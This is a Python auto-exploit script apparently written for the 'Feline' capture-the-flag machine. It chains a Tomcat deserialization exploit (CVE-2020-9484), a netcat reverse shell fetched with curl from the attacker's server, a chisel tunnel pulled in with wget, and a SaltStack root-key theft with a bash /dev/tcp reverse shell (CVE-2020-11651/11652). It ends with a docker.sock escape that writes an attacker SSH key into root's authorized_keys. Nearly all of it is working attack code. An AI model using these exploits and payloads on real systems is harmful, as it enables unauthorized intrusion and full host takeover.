#!/usr/bin/python3
import requests
import os
import sys
from colorama import Fore
import coloredlogs
import logging
import time
import argparse
from pwn import *
import salt
import salt.transport.client
import salt.exceptions
import datetime
import paramiko
import io

burp_debug = {'http': 'http://127.0.0.1:8888'}

logger = logging.getLogger(__name__)
coloredlogs.install(level='INFO', fmt='%(asctime)s-%(hostname)s-%(message)s', logger=logger)

#File Requirements
#1. serve content over http.server
#2. chisel binary in directory where you run run http server
#3. ysoserial jar in directory where you run script

#example
#python3 pig-felinePwn.py  -i 10.10.14.33 -p 4444 -t root -s 8443 -fh 10.129.4.96 -c 8000

def get_args():
	parser =argparse.ArgumentParser(description="Dumpster AutoPwn for Feline", usage="python <script>.py -i <ip> -p <port> -t <user|root>", epilog="")
	parser.add_argument('-i','--ip',type=str, help="Attacker IP", required=True)
	parser.add_argument('-p','--port',type=str, help="Attacker Port",required=True)
	parser.add_argument('-t','--target', type=str, help="Our Target", choices=['user', 'intermediate', 'root'], required=True)
	parser.add_argument('-s','--serverport', type=str, help="Our HTTP Server Port", required=True)
	parser.add_argument('-fh','--felineip', type=str, help="IP of Feline server", required=True)
	parser.add_argument('-c', '--chiselport', type=str, help="Chisel port to use (defaults to 8000 if not specified)", required=False)
	args = parser.parse_args()
	attacker_ip = args.ip
	attacker_port = args.port
	target = args.target
	server_port = args.serverport
	feline_ip = args.felineip
	chisel_port = args.chiselport
	return attacker_ip,attacker_port,target, server_port, feline_ip, chisel_port

#CVE-2020-9484 - https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/
def makeUploadRequest(baseurl,filename, content):
	url = baseurl + "upload.jsp?email=test@test.com"
	logger.info("Writing shell to filename: %s" %filename)
	filesDict = {filename : content}
	r = requests.post(url, files=filesDict,proxies=burp_debug)
	logger.info("Status code %s"% r.status_code)	

def makeFollowUpRequest(directory, url):
	logger.info("Making request to: %s with JSESSIONID: %s" % (url,directory))
	cookie = {"JSESSIONID": directory}
	r = requests.get(url,proxies =burp_debug,cookies=cookie)

def writeBasicShell(attacker_ip, attacker_port, filename, payload):
	logger.info("Writing shell to filename: %s" %filename)
	

	logger.info("Payload is: %s" % payload)
	with open(filename, 'w') as fh:
		fh.writelines(["#!/bin/sh\n",payload])

#Executes phase1 for 
def executePhase(serialFilename, formFilename,directory,baseurl):
	with open(serialFilename,"rb") as f:
		contents = f.read()
		logger.info("Uploading serialized payload..")
		makeUploadRequest(baseurl,formFilename,contents)
		logger.info("Triggering Deserialization")
		makeFollowUpRequest(directory,baseurl)

def executeUser(attacker_ip,attacker_port,feline_ip,server_port):
	
	baseurl = "http://%s:8080/" % feline_ip
	
	directory = "../../../../../../opt/samples/uploads/testas1"
	serialFilename = "testserial.txt"
	formFilename = "testas1.session"
	#retrieveFilename = "test.txt"
	shellFilename = "dada.sh"
	payload = """rm /tmp/f2;mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i 2>&1|nc %s %s >/tmp/f2\n""" % (attacker_ip, attacker_port)
	writeBasicShell(attacker_ip,attacker_port,shellFilename, payload)

	logger.info("Creating phase1 payload")
	os.system("""java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections6 'curl http://%s:%s/%s -o /opt/samples/uploads/%s' > %s""" % (attacker_ip,server_port,shellFilename,shellFilename,serialFilename))
	executePhase(serialFilename, formFilename,directory,baseurl)
	time.sleep(3)

	logger.info("Creating phase2 payload")
	os.system("""java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections6 'chmod +x /opt/samples/uploads/%s' > %s""" % (shellFilename,serialFilename))
	executePhase(serialFilename, formFilename,directory,baseurl)

	logger.info("Creating phase3 payload")
	os.system("""java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections6 '/opt/samples/uploads/%s' > %s""" % (shellFilename,serialFilename))
	executePhase(serialFilename, formFilename,directory,baseurl)

def executeIntermediate(shell, attacker_ip,server_port,chisel_port): 

	logger.info("Checking for chisel and downloading from compromised server")
	l1.sendline("""python3 -c 'import pty; pty.spawn("/bin/bash")'""")
	l1.sendline("""if [ ! -d /tmp/.test ]; then mkdir /tmp/.test; fi """)
	time.sleep(1)
	l1.sendline("""if [ ! -f /tmp/.test/chisel ]; then wget http://%s:%s/chisel -O /tmp/.test/chisel; fi""" % (attacker_ip,server_port))
	l1.sendline("chmod +x /tmp/.test/chisel")
	logger.info("Running chisel on server...") 
	l1.sendline("""/tmp/.test/chisel client %s:%s R:4506:127.0.0.1:4506 &""" % (attacker_ip,chisel_port))

def executeIntermediate2(attacker_ip,server_port):
	logger.info("[-] Starting Saltstack exploit CVE-2020-11652")
	payload = """bash -c "bash -i >& /dev/tcp/%s/%d 0>&1" """ % (attacker_ip, int(attacker_port)+1)
	channel = init_minion("127.0.0.1","4506")				
	root_key = getRootkey_CVE_2020_11651(channel)
	logger.info(Fore.GREEN + "[+] Retrieved root key from Salt Master! It is: {}".format(root_key) + Fore.RESET)
	jid = '{0:%Y%m%d%H%M%S%f}'.format(datetime.datetime.utcnow())
	salt_exec(channel, root_key, payload, "127.0.0.1", jid)
	channel.close()	

### START Functions are credit to Jasper Lievisee Andriaanse's POC for CVE-2020-11651-poc ###
def init_minion(master_ip,master_port):
	
	minion_config = {'transport': 'zeromq',
		'pki_dir': '/tmp',
		'id': 'root',
		'log_level': 'debug',
		'master_ip': master_ip,
		'master_port': master_port,
		'auth_timeout': 5,
		'auth_tries': 1,
		'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port)
	}
	return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear')

def check_connection(master_ip, master_port, channel):
	print("[+] Checking salt-master ({}:{}) status... ".format(master_ip, master_port), end='')
	sys.stdout.flush()

	# connection check
	try:
		channel.send({'cmd':'ping'}, timeout=2)
	except salt.exceptions.SaltReqTimeoutError:
		print("OFFLINE")
		sys.exit(1)
	else:
		print("ONLINE")

def getRootkey_CVE_2020_11651(channel):
	try:
		rets = channel.send({'cmd': '_prep_auth_info'}, timeout=3)
		#print(rets)
	except:
		log.error("Error encountered")
		return None
	finally:
		if rets:
			root_key = rets[2]['root']
			return root_key
	return None

def salt_exec(channel, root_key, cmd, master_ip, jid):
	msg = {
		'key': root_key,
		'cmd': 'runner',
		'fun': 'salt.cmd',
		'saltenv': 'base',
		'user': 'sudo_user',
		'kwarg': {
		'fun': 'cmd.exec_code',
		'lang': 'python',
		'code': "import subprocess;subprocess.call('{}',shell=True)".format(cmd)
	},
		'jid': jid,
	}
	try:
		rets = channel.send(msg,timeout=3)
	except Exception as e:
		logger.error("[-] Failed to submit job")
		return
	if rets.get('jid'):
		logger.info('[+] Successfully scheduled job: {}'.format(rets['jid']))
### END

if __name__ == "__main__":

	attacker_ip, attacker_port, target ,server_port,feline_ip, chisel_port = get_args()
	if target == "user":
		
		input(Fore.YELLOW + "1. This step uses the ysoserial jar.\nThe command used is: 'java -jar ysoserial-master-SNAPSHOT.jar -params' Copy the ysoserial jar into the same directoy as where you ran the Python script. \n"\
			+ "2. Start a HTTP listener on port: {} \n".format(server_port) \
			+ ">>> Press any key to continue the step <<<" + Fore.RESET)
		l1 = listen(attacker_port)
		executeUser(attacker_ip,attacker_port,feline_ip,server_port)
		time.sleep(2)
		l1.wait_for_connection()
		logger.info(Fore.GREEN + "[+] Success! Enjoy user shell!" + Fore.RESET)
		l1.interactive()
	
	elif target == "intermediate":
		chisel_port = 8000 if chisel_port is None else chisel_port
		input(Fore.YELLOW + "1. Start chisel manually with ./chisel -p {} --reverse\n".format(chisel_port)\
			+ "2. Start a HTTP listener on port: {} \n".format(server_port) \
			+ ">>> Press any key to continue the step <<<"+ Fore.RESET )
				
		l1 = listen(attacker_port)
		executeUser(attacker_ip,attacker_port,feline_ip,server_port)
		time.sleep(2)
		l1.wait_for_connection()
		executeIntermediate(l1, attacker_ip,server_port,chisel_port)

		l2 = listen(int(attacker_port)+1)
		executeIntermediate2(attacker_ip,server_port)
		l2.wait_for_connection()
		logger.info(Fore.GREEN + "[+] Success! Enjoy shell on the salt master!!" + Fore.RESET)
		l2.interactive()


	elif target == "root":
		chisel_port = 8000 if chisel_port is None else chisel_port
		input(Fore.YELLOW + "1. Start chisel manually with ./chisel -p {} --reverse\n".format(chisel_port)\
			+ "2. Start a HTTP listener on port: {} \n".format(server_port) \
			+ ">>> Press any key to continue the step <<<"+ Fore.RESET )

		key = paramiko.RSAKey.generate(2048)
		pubkey = key.get_base64()
		outname = io.StringIO()
		key.write_private_key(outname)
		#print (outname.getvalue())
		rootPrivFilename = "feline-root.key"	
		key.write_private_key_file(rootPrivFilename)
		logger.info("[+] Saving key to file: %s" % rootPrivFilename)
				
		l1 = listen(attacker_port)
		executeUser(attacker_ip,attacker_port,feline_ip,server_port)
		time.sleep(2)
		l1.wait_for_connection()

		executeIntermediate(l1, attacker_ip,server_port,chisel_port)
		l2 = listen(int(attacker_port)+1)
		executeIntermediate2(attacker_ip,server_port)
		l2.wait_for_connection()

		logger.info("[+] We are on the salt master! However we are not root on the host yet!")
		payload = "echo ssh-rsa %s doodoo@doododo.com > /root/.ssh/authorized_keys" % pubkey
		#print (payload)
		logger.info("Executing Privesc to host")
		logger.info("Making requests to Docker daemon on unix-socket /var/run/docker.sock..")
		logger.info("Calling API: http://localhost/containers/create")
		logger.info("Mounting root filesystem")
		l2.sendline("""id=$(curl -s --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "sandbox:latest", "Binds" : ["/:/mnt:rw"] , "Cmd": ["/bin/sh", "-c", "chroot /mnt sh -c \\"%s\\"" ]}' http://localhost/containers/create | cut -d '"' -f4) """ % payload)
		logger.info("Calling API: http://localhost/containers/<id>/start")
		l2.sendline("""curl -X POST -s --unix-socket /var/run/docker.sock http://localhost/containers/${id}/start""")
		time.sleep(2)
		#l2.interactive() ## Intermediate shell
		logger.info("Attempting to SSH into host as root")
		ssh_connect = ssh(host=feline_ip,user='root', keyfile=rootPrivFilename)
		logger.info(Fore.GREEN + "[+] Success! Enjoy a root SSH session on the host" + Fore.RESET)
		ssh_connect.interactive()
			
		









